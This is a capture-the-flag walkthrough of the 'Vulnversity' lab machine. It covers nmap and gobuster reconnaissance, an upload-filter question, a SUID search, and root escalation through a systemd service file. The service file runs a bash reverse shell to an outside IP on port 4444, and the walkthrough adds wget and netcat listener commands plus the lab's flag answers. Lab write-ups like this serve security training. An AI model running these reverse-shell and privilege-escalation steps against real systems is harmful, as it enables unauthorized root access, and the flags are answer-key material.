## Reconnaissance 

> nmap scan fof the machine
cmd : nmap -sV 10.10.26.46

'''
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 07:42 EDT
Nmap scan report for 10.10.26.46
Host is up (0.20s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.64 seconds

'''

>> Scan the box, how many ports are open?
=> 6

>> What version of the squid proxy is running on the machine?
=> 3.5.12

>> How many ports will nmap scan if the flag -p-400 was used?
=> 400

>>Using the nmap flag -n what will it not resolve?
=> dns

>>What is the most likely operating system this machine is running?
=> ubuntu

>>What port is the web server running on?
=> 3333

## Locating directories using GoBuster 

scanning the target with gobuster for all the directories

cmd : gobuster dir -u http://10.10.26.46:3333 -w /usr/share/wordlists/dirb/common.txt

>> What is the directory that has an upload form page?
=> /internal/

## Compromise the webserver 

>> Try upload a few file types to the server, what common extension seems to be blocked?
=> .php

>> What is the name of the user who manages the webserver?
=> bill

>> What is the user flag?
=> 8bd7992fbe8a6ad22a63361004cfcedb

searching for SUID set files
cmd 1 : find / -perm 4000
cmd 2 : find / -user root -perm 4000 -print 2 > /dev/null

>>On the system, search for all SUID files. What file stands out?
=> /bin/systemctl

creating a new service to run

"""
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.18.67.210/4444 0>&1'

[Install]
WantedBy=multi-user.target


"""
then start the server on local machine and put the service file into a shareble servers folder

goto temp directory in remote machine
in the remote shell : wget http://<ip of local machin>/file_path
start the netcat in local machine : nc -lvnp 4444 
creating the service : systemctl enable /tmp/root.service  
starting the service in remote machine : systemctl start root

then local netcat should received a connecting with root shell access.

>>Become root and get the last flag (/root/root.txt)
=> a58ff8579f0a9270368d33a9966c7fd5











